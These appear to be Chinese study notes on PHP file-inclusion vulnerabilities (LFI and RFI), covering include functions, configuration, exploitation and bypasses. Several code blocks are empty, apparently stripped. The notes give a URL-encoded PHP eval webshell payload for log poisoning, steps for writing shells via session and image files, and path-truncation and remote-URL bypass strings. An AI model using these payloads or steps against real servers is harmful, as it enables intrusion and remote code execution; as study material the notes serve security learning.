# File Include 任意文件包含 服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP脚本来执行，这会节省大量时间 ## 1.文件包含函数 PHP中提供了四个文件包含语函数 | 函数 | 区别描述 | | ---------------- | ------------------------------------------------------------ | | `include()` | 多次包含，多次执行；
如果包含失败，脚本产生警告，继续运行。 | | `include_once()` | 只包含一次
如果包含失败，脚本产生警告，继续运行。 | | `require()` | 多次包含，多次执行；
如果包含失败，脚本产生错误，结束执行。 | | `require_once()` | 只包含一次
如果包含失败，脚本产生错误，结束执行。 | ## 2.相关配置 文件包含是PHP 的基本功能之一,有本地文件包含与远程文件包含之分,本地文件包含可以读取和打开本地文件,远程文件包含可以远程(方式)加载文件。 可以通过php.ini 中的选项进行配置。 多个路径可用冒号 :（Linux）或分号 ;（Windows）分隔。 ## 3.动态包含 ### 3.1示例代码 ### 3.2本地文件包含 本地文件包含(Local File Include,LFI)通过本地路径访问到的文件。 ### 3.3远程文件包含 远程文件包含(Remote File Include,RFI),通过远程路径访问到的文件。 ## 4.常见利用方式 ### 4.1包含session文件 php session文件存放路径可以通过phpinfo页面中的session.save.path来获得，session文件名一般由sess_+sessionid组成 session_id可以通过查看页面的cookie信息中的PHPSESSID获得 若session_start()开启，则用户传输的数据会被保存在session文件中，就可以向session文件中写入shell ### 4.2包含图片木马 蚁剑直接连接 ### 4.3任意文件读取 前提条件： 目标文件存在（已知目标文件路径） 具有文件可读权限 具体方法： ### 4.4包含图片码写Shell 条件： 确定文件包含漏洞存在 蚁剑不能直接连接 写shell： 再用蚁剑连接 ### 4.6包含日志文件 日志文件是Web服务器记录包含页面请求的历史记录，一般格式如下： ![image-20260320223913541](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260320223913541.png) 日志文件会记录访问请求，因此可以被写入shell 经过URL编码 %3C%3Fphp%20eval%28%24POST%5Bqmd%5D%29%20%3F%3E可以传入存在文件包含漏洞的文件中，因为文件不存在所以会报错，但会被日志记录，因此包含日志文件就可以getshell Apache 日志: 访问日志 错误日志 Nginx 日志: 访问日志 错误日志 SSH 日志 邮件日志 ### 4.7配合文件上传 ### 4.8PHP伪协议 ## 5.常见绕过方式 ### 5.1本地文件包含 ![image-20260320225959673](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20260320225959673.png) 路径长度截断： 利用条件：php版本 < php 5.2.8 Windows下目录最大长度为256字节，超出的部分会被丢弃 Linux下目录最大长度为4096字节，超出的部分会被丢弃 include $file.'/test/test.php'; 文件包含函数如果指定后缀，则可以不断增加输入的文件路经来获取所要包含的文件 index.php?file =. /./.// .... .. / shell.txt 后缀/test/test.php在达到最大值是会被丢弃 ### 5.2远程文件包含 文件包含函数如果指定后缀： include $file.'/test/test.php'; 可以通过问号来绕过： index.php?file=http://remoteaddr/remoteinfo.txt?
